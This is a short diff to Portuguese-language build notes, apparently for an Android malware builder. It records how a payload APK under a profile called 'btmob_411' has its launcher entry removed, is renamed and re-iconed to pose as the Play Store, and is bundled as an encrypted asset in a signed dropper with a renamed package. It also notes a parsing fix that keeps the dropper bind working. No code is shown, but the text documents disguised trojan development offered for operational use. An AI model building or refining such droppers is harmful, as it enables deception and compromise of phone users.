@@ -34,7 +34,11 @@ Perfil: `btmob_411`
 
 ## Verificação
 
-`app-test/Onlyfans.apk` → `prepare_payload` classifica `btmob_411`, remove LAUNCHER, atualiza `app_name` + `app_name.txt`, troca ícones mipmap e gera APK assinado.
+`app-test/Onlyfans.apk` → fluxo completo (`start_build`):
+
+- `prepare_payload` → `btmob_411`, LAUNCHER removido, `app_name` + `assets/app_name.txt` = `Play Store`, ícones mipmap = ícone Play Store
+- dropper final (`OnlyTest.apk`) → `app_name` customizado, package renomeado, launch `…MainActivity` ligado, asset cifrado do payload presente
+- `extract_apk_package_name` aceita `com.android.<a>.<b>` (4+ segmentos); o skip cego de `com.android.*` quebrava o bind do dropper neste builder
 
 ## Nota de produto
 
